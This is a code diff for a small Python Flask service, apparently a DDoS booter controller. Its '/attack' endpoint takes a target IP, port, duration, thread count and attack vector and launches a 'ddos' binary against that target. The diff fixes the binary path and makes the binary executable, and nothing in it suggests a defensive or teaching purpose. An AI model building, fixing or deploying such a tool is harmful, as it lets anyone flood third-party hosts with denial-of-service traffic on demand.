@@ -8,7 +8,7 @@ os.system(f'{sys.executable} -m pip install flask --quiet')
 from flask import Flask, request
 
 app = Flask(__name__)
-BINARY = "./ddos"
+BINARY = "/app/ddos"
 
 @app.route('/attack')
 def attack():
@@ -18,10 +18,13 @@ def attack():
     threads = request.args.get('threads')
     vector = request.args.get('vector', '5')
     
+    # Make binary executable
+    os.system(f'chmod +x {BINARY}')
+    
     cmd = [BINARY, ip, port, time, threads, vector]
     subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     return f"Started: {ip}:{port} | {time}s | {threads} threads | vector {vector}"
 
 if __name__ == '__main__':
-    os.system('chmod +x *')
+    os.system(f'chmod +x {BINARY}')
     app.run(host='0.0.0.0', port=8080)
